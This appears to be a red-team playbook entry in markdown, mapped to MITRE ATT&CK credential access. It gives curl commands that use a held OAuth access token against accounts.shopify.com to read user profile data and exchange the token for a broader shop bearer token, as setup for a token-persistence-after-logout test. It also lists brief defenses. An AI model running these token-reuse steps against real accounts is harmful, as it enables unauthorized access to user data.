---
tags:
  - api-access
  - userinfo
  - token-exchange
type: procedure
tools:
  - '[[tools/okhttp]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/userinfo-retrieve]]'
  - '[[commands/token-exchange-for-unified-bearer]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:24:45.102Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 760ddc1f-7557-4ec0-a8c8-264a579fd776
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Perform-Authenticated-Actions-with-Primary-Token

## Summary

This procedure uses the primary access_token (tokenA) to perform authenticated requests, such as retrieving user information and exchanging for a shop-specific unified bearer token (tokenB).

## Description

With tokenA in hand, requests to /oauth/userinfo fetch user details, while a token exchange grants tokenB for shop API access. This demonstrates the token's validity during an active session and sets up the persistence test post-logout. Target environment is accounts.shopify.com; prerequisites are valid tokenA.

## Requirements

1. Valid access_token (tokenA)
2. Network access to accounts.shopify.com
3. Client ID for exchanges

## Defense

Defensive measures and detection strategies:

- Scope tokens minimally to reduce exposure
- Monitor API calls for unusual patterns
- Implement rate limiting on token endpoints

## Objectives

1. Access user profile data
2. Obtain secondary tokens for broader access
3. Validate token functionality

## Instructions

### Step 1: Retrieve User Information

**Context**: Use tokenA to GET /oauth/userinfo.

**Command** ([[commands/userinfo-retrieve]]):
```bash
curl -X GET https://accounts.shopify.com/oauth/userinfo \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Authorization: Bearer [tokenA]"
```

> Expected output: {"sub":"...","email":".....@gmail.com","email_verified":true,"family_name":"Doe","given_name":"....","locale":"en","name":".... ...","nickname":".....","updated_at":.....,"zoneinfo":"....","tfa_enabled":false}

### Step 2: Exchange for Unified Bearer Token

**Context**: POST to /oauth/token for tokenB.

**Command** ([[commands/token-exchange-for-unified-bearer]]):
```bash
curl -X POST https://accounts.shopify.com/oauth/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "subject_token=[tokenA]&subject_token_type=urn:ietf:params:oauth:token-type:access_token&client_id=8bb79a45-2d69-4890-9006-ab6ca705d708"
```

> Expected output: HTTP/1.1 200 OK with new access_token.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/userinfo-retrieve]]
- [[commands/token-exchange-for-unified-bearer]]

## Tools Used

- [[tools/okhttp]]

## Tags

- api-access
- userinfo
- token-exchange
